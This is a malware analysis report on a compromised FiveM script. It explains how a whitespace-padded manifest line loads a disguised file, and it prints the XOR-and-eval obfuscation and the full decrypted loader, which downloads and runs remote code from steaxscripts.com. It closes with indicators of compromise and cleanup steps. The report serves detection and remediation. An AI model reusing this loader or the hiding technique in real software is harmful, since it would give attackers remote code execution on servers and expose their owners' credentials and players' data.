# ðŸš¨ Malware Analysis Report - ec-multijob-reskin

## Summary

This FiveM script (ec-multijob) has been compromised with hidden malware that downloads and executes remote code.

---

## Malicious Domain & Endpoints

| Component | Value |
|-----------|-------|
| **Domain** | `steaxscripts.com` |
| **Primary URL** | `https://steaxscripts.com/zXeAHJJGG` |
| **Fallback URL** | `https://steaxscripts.com/cfxre` |

---

## Injection Method

The malware was injected using a clever obfuscation technique in `fxmanifest.lua`:

### Line 17 in fxmanifest.lua:
```lua
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.jest.config.js',
```

**What happens:**
1. `--[[server.lua]]` appears as a Lua comment (block comment syntax)
2. Followed by approximately **600+ whitespace characters** (spaces) to push the actual malicious content off-screen
3. At the end of the line: `'client/lib/.jest.config.js'` - the actual malware file being loaded

This technique exploits the fact that:
- Developers don't scroll horizontally in their editors
- The file appears to just have a commented line
- The malicious JavaScript file is loaded as a "server script" in FiveM

---

## Malware File Location

**File:** `client/lib/.jest.config.js`

The file is hidden using:
- A `.` prefix (hidden file on Unix systems)
- Disguised as a Jest testing configuration file
- Located in a `lib` subdirectory

---

## Obfuscation Method

The malware uses a simple **XOR cipher** with key `3`:

```javascript
x = (e, k=3) => [...e].map(c => String.fromCharCode(c.charCodeAt() ^ k)).join("");
```

The encrypted payload is stored in variable `v`, then decrypted and executed using:
```javascript
globalThis[x("fubo")](x(v));  // x("fubo") = "eval"
```

---

## Decrypted Malware Code

```javascript
const https = require("https");

const domain = "steaxscripts.com";
const url = "https://" + domain + "/zXeAHJJGG";
const fallback = "https://" + domain + "/cfxre";

try {
  https.get(url, (res) => {
    let d = "";
    res.on("data", (chunk) => {
      d += chunk;
    });
    res.on("end", () => {
      try {
        if (d.trim().startsWith("<")) throw 0;  // Skip HTML error pages
        new Function("global", d)(global);       // Execute downloaded code
      } catch {
        try {
          // Fallback to secondary URL
          https.get(fallback, (fallbackRes) => {
            let fd = "";
            fallbackRes.on("data", (chunk) => {
              fd += chunk;
            });
            fallbackRes.on("end", () => {
              try {
                new Function("global", fd)(global);
              } catch {}
            });
          }).on("error", () => {});
        } catch {}
      }
    });
  }).on("error", () => {});
} catch {}
```

---

## Malware Behavior

1. **Downloads remote JavaScript** from `steaxscripts.com`
2. **Executes the downloaded code** using `new Function()` which is equivalent to `eval()`
3. **Has fallback mechanism** - if primary URL fails, tries secondary endpoint
4. **Silent failure** - all errors are silently caught to avoid detection
5. **Bypasses HTML errors** - if response starts with `<` (HTML error page), it skips execution

### Potential Capabilities (depends on remote payload):
- Steal server configuration files
- Access database credentials
- Exfiltrate player data
- Execute arbitrary commands on the server
- Install backdoors
- Crypto mining
- DDoS participation

---

## Indicators of Compromise (IOC)

### Network:
- Outbound HTTPS connections to `steaxscripts.com`
- DNS queries for `steaxscripts.com`
- HTTP requests to `/zXeAHJJGG` or `/cfxre`

### Files:
- `client/lib/.jest.config.js` - the malware payload
- `fxmanifest.lua` line 17 with excessive whitespace

### Strings:
- `steaxscripts.com`
- `zXeAHJJGG`
- `cfxre`
- XOR key `3` with the decryption function

---

## Remediation Steps

1. **Delete the malware file:**
   ```bash
   rm -rf client/lib/
   ```

2. **Clean fxmanifest.lua** - Remove line 17 containing the hidden malware reference

3. **Check for persistence** - Review all files for similar patterns

4. **Block the domain** - Add `steaxscripts.com` to your firewall/blocklist

5. **Rotate credentials** - Change all database passwords and API keys that may have been exposed

6. **Audit logs** - Check server logs for any suspicious activity

---

## Files to Remove/Clean

| File | Action |
|------|--------|
| `client/lib/.jest.config.js` | DELETE |
| `client/lib/` | DELETE (entire directory) |
| `fxmanifest.lua` line 17 | REMOVE the hidden malicious line |

---

## Attribution

The malware points to `steaxscripts.com` which appears to be a FiveM script distribution site that may be involved in distributing malware-infected scripts to unsuspecting server owners.

---

*Analysis performed: 2024*
*This is a security analysis report for educational and protective purposes.*
